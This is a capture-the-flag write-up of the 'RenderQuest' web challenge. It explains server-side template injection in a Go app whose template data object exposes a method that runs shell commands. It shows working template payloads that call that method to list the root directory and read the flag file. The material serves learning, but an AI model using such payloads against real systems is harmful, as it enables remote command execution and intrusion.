---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Web: RenderQuest

## Website

The website allows to specify an address to a template, which will then get rendered. Also there are some variables that are available for use within the template. Presumably they contain some dynamic data. This looks like SSTI (Server-Side Template Injection).

## Code

It is writen in Go, that got its tempating engine. Quick scan throught the code reveals few things.

The data fed into the template is fed by `reqData` object. What is intereisng is this lines.

```
	reqData.ServerInfo.Hostname = reqData.FetchServerInfo("hostname")
	reqData.ServerInfo.OS = reqData.FetchServerInfo("cat /etc/os-release | grep PRETTY_NAME | cut -d '\"' -f 2")
	reqData.ServerInfo.KernelVersion = reqData.FetchServerInfo("uname -r")
	reqData.ServerInfo.Memory = reqData.FetchServerInfo("free -h | awk '/^Mem/{print $2}'")
```

That looks like a shell execution. And it really is:

```
func (p RequestData) FetchServerInfo(command string) string {
	out, err := exec.Command("sh", "-c", command).Output()
	if err != nil {
		return ""
	}
	return string(out)
}
```

Ok, so that's the way, now how to exploit it

## SSTI in Go

Quick google helps in understaning how to bend Go templating. https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#ssti-in-go

Let's check it with `{{printf "%s" "ssti" }}` I upload the template on https://pastebin.com to make it available on public URL. The template:

```
<!DOCTYPE html>
<html lang="en">
 
<head>
    <meta charset="UTF-8">
    <meta name="author" content="lean">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="/static/logo.png" type="image/png">
    <link rel="stylesheet" href="/static/css/bootstrap.min.css">
    <title>RenderQuest</title>
</head>
 
<body>
{{printf "%s" "ssti" }}
</body>
 
</html>
```

Cool, that works. as "ssti" is rendered.

What is imporant is this paragraph: *If you want to find a RCE in go via SSTI, you should know that as you can access the given object to the template with* `{{ . }}`, *you can also call the objects methods. So, imagine that the passed object has a method called System that executes the given command, you could abuse it with:* `{{ .System "ls" }}`

Meaning that I can just call the method `FetchServerInfo` and pass argument as command. Lets call:

```
...
<body>
{{ .FetchServerInfo "ls /" }}
</body>
...
```

Which prints the files, including the flag with randomised name.

Finaly I can read the flag.

```
...
<body>
{{ .FetchServerInfo "cat ../flag1e888ae6e8.txt" }}
</body>
...
```

Boom, done.